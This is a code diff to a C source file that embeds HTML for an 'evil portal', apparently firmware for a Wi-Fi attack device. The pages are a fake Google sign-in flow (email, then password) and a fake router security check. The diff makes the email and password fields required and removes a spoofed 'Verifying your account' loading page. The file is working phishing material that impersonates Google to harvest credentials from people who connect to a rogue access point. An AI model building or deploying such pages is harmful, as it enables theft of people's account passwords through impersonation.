@@ -54,7 +54,7 @@ const char EVIL_PORTAL_HTML_GOOGLE_STEP1[] =
     "<form action='/post' method='POST'>"
     "<input type='hidden' name='step' value='1'>"
     "<div class='iw'><label>Email or phone</label>"
-    "<input type='text' name='email' autocomplete='username' autofocus></div>"
+    "<input type='text' name='email' autocomplete='username' autofocus required></div>"
     "<a class='link' href='#'>Forgot email?</a>"
     "<div class='row'>"
     "<a class='link' href='#'>Create account</a>"
@@ -77,7 +77,7 @@ const char EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL[] =
     "<input type='hidden' name='step' value='2'>"
     "<input type='hidden' name='email' value='%EMAIL%'>"
     "<div class='iw'><label>Enter your password</label>"
-    "<input type='password' name='password' id='pw' autocomplete='current-password' autofocus></div>"
+    "<input type='password' name='password' id='pw' autocomplete='current-password' autofocus required></div>"
     "<label class='showpwd'><input type='checkbox' id='sp'>Show password</label>"
     "<div class='row'>"
     "<a class='link' href='#'>Forgot password?</a>"
@@ -137,24 +137,10 @@ const char EVIL_PORTAL_HTML_ROUTER[] =
     "<div class=\"note\">This is a one-time security verification.</div>"
     "</div></body></html>";
 
-const char EVIL_PORTAL_HTML_LOADING[] =
-    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
-    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
-    "<title>Authenticating...</title>"
-    "<style>"
-    "body{font-family:Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;color:#333}"
-    ".sp{border:4px solid #eee;border-top:4px solid #1a73e8;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin-bottom:18px}"
-    "@keyframes spin{to{transform:rotate(360deg)}}"
-    "p{font-size:15px}"
-    "</style></head><body>"
-    "<div class=\"sp\"></div><p>Verifying your account...</p>"
-    "</body></html>";
-
 const size_t EVIL_PORTAL_HTML_GOOGLE_STEP1_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP1) - 1;
 const size_t EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL) - 1;
 const size_t EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_FAILED) - 1;
 const size_t EVIL_PORTAL_HTML_ROUTER_LEN = sizeof(EVIL_PORTAL_HTML_ROUTER) - 1;
-const size_t EVIL_PORTAL_HTML_LOADING_LEN = sizeof(EVIL_PORTAL_HTML_LOADING) - 1;
 
 const char* const EVIL_PORTAL_HTML_GOOGLE = EVIL_PORTAL_HTML_GOOGLE_STEP1;
 const size_t EVIL_PORTAL_HTML_GOOGLE_LEN = sizeof(EVIL_PORTAL_HTML_GOOGLE_STEP1) - 1;
